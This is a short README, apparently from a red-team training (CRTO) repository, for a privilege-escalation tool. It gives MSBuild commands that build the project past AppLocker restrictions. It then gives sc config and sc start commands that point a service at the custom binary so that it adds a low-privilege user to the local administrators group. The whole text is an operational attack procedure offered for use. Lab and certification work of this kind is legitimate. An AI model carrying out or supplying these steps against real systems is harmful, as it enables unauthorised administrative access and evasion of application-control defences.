# CRTO

Bypass AppLocker via MSBUILD, priv-esc via *service* binary to add low priv user to local administrators group.
## Build

```cmd
  C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe esc.csproj
```
or
```cmd
  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe esc.csproj
```
## Run

```
  copy bin\Release\AnyCPU\YourServiceName.exe C:\Windows\Tasks
  sc config svc_test binPath= "C:\Windows\Tasks\YourServiceName.exe"
  sc start svc_test
  net localgroup administrators
  logoff
```
